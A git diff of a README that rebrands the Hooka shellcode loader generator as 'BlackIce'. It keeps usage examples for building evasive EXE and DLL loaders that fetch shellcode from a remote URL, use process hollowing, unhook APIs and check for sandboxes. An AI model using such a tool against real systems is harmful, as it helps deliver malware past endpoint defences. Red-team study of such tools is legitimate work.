@@ -1,21 +1,26 @@
 <p align="center">
-  <h1 align="center">Hooka</h1>
-  <h4 align="center">Shellcode loader generator with multiples features</h4>
-  <h6 align="center">Coded with 💙 by D3Ext</h6>
+<pre align="center" style="color: #00ffffff;">
+▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██ ▄█▀ ██▓ ▄████▄  ▓█████ 
+▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██▒▒██▀ ▀█  ▓█   ▀ 
+▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒██▒▒▓█    ▄ ▒███   
+▒██░█▀  ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░██░▒▓▓▄ ▄██▒▒▓█  ▄ 
+░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░██░▒ ▓███▀ ░░▒████▒
+░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓  ░ ░▒ ▒  ░░░ ▒░ ░
+▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░  ░  ▒    ░ ░  ░
+ ░    ░   ░ ░    ░   ▒   ░        ░ ░░ ░  ▒ ░░           ░   
+ ░          ░  ░     ░  ░░ ░      ░  ░    ░  ░ ░         ░  ░
+      ░                  ░                   ░               
+</pre>
 </p>
+
+<h1 align="center">BlackIce</h1>
+<h4 align="center">Shellcode loader generator with multiple features</h4>
+<h6 align="center">Coded by MrDedSec (Shout out D3Ext!)</h6>
 
 <p align="center">
 
   <a href="https://opensource.org/licenses/MIT">
     <img src="https://img.shields.io/badge/license-MIT-_red.svg">
-  </a>
-
-  <a href="https://github.com/D3Ext/Hooka/blob/main/CHANGELOG.md">
-    <img src="https://img.shields.io/badge/maintained%3F-yes-brightgreen.svg">
-  </a>
-
-  <a href="https://github.com/D3Ext/go-recon/issues">
-    <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat">
   </a>
 
 </p>
@@ -30,8 +35,7 @@
 
 # Introduction
 
-Hooka is able to generate shellcode loaders with multiple capabilities. It is also based on other tools like [BokuLoader](https://github.com/boku7/BokuLoader), [Freeze](https://github.com/optiv/Freeze) or [Shhhloader](https://github.com/icyguider/Shhhloader), and it tries to implement more evasion features. Why in Golang? Although it's not the perfect language for malware dev, it works perfectly for testing purposes. Obviously if you want something professional and foolproof you should create your own loader in C++, C# or similars.
-
+BlackIce is able to generate shellcode loaders with multiple capabilities. It is also based on Hooka (see [here](https://github.com/D3Ext/Hooka)). This tool is intended for my own learning, please no not use the tool for malicious activity.  
 # Features
 
 This tool is able to generate loaders with this features:
@@ -79,8 +83,8 @@ This tool is able to generate loaders with this features:
 Just clone the repository like this:
 
 ```sh
-git clone https://github.com/D3Ext/Hooka
-cd Hooka
+git clone https://github.com/Mrdedsecurity/BlackIce.git
+cd BlackIce-Loader
 make
 ```
 
@@ -90,7 +94,7 @@ After that you will find the binary under the `build/` folder
 
 > Help panel
 ```
-Usage of Hooka:
+Usage of BlackIce:
   REQUIRED:
     -i, --input string        payload to inject in raw format, as PE, as DLL or from a URL
     -o, --output string       name of output file (i.e. loader.exe)
@@ -137,28 +141,28 @@ Usage of Hooka:
     -h, --help          print help panel
 
 Examples:
-  hooka -i shellcode.bin -o loader.exe
-  hooka -i http://192.168.1.126/shellcode.bin -o loader.exe
-  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
-  hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
+  blackice -i shellcode.bin -o loader.exe
+  blackice -i http://192.168.1.126/shellcode.bin -o loader.exe
+  blackice -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
+  blackice -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
 ```
 
 > Generate a simple EXE loader
 ```sh
-$ hooka_linux_amd64 -i shellcode.bin -o loader.exe
+$ blackice_linux_amd64 -i shellcode.bin -o loader.exe
 ```
 
 > Generate a DLL loader
 ```sh
-$ hooka_linux_amd64 -i shellcode.bin -o loader.dll -f dll
+$ blackice_linux_amd64 -i shellcode.bin -o loader.dll -f dll
 ```
 
 > Use custom config (various examples)
 ```sh
-$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --hashing --agc --sleep --verbose
-$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --exec ProcessHollowing --sgn --strings --blockdlls
-$ hooka_linux_amd64 -i http://xx.xx.xx.xx/shellcode.bin --sandbox --sleep --domain www.microsoft.com --verbose
-$ hooka_linux_amd64 --calc -o loader.exe --user "DESKTOP-E1D6G0A\tom" --computername "DESKTOP-E1D6G0A" --compress --strings
+$ blackice_linux_amd64 -i shellcode.bin -o loader.exe --hashing --agc --sleep --verbose
+$ blackice_linux_amd64 -i shellcode.bin -o loader.exe --exec ProcessHollowing --sgn --strings --blockdlls
+$ blackice_linux_amd64 -i http://xx.xx.xx.xx/shellcode.bin --sandbox --sleep --domain www.microsoft.com --verbose
+$ blackice_linux_amd64 --calc -o loader.exe --user "DESKTOP-E1D6G0A\tom" --computername "DESKTOP-E1D6G0A" --compress --strings
 ```
 
 # Demo
@@ -166,12 +170,6 @@ $ hooka_linux_amd64 --calc -o loader.exe --user "DESKTOP-E1D6G0A\tom" --computer
 <img src="https://raw.githubusercontent.com/D3Ext/Hooka/main/assets/demo1.png">
 
 <img src="https://raw.githubusercontent.com/D3Ext/Hooka/main/assets/demo2.png">
-
-# TODO
-
-- ~~Check username and hostname before running~~
-- Add direct and indirect syscall
-- Add Chacha20 cypher to encrypt shellcode
 
 # Library
 
@@ -212,8 +210,6 @@ Use this project under your own responsability! The author is not responsible of
 # License
 
 This project is under [MIT](https://github.com/D3Ext/Hooka/blob/main/LICENSE) license
-
-Copyright © 2025, *D3Ext*
 
 
 
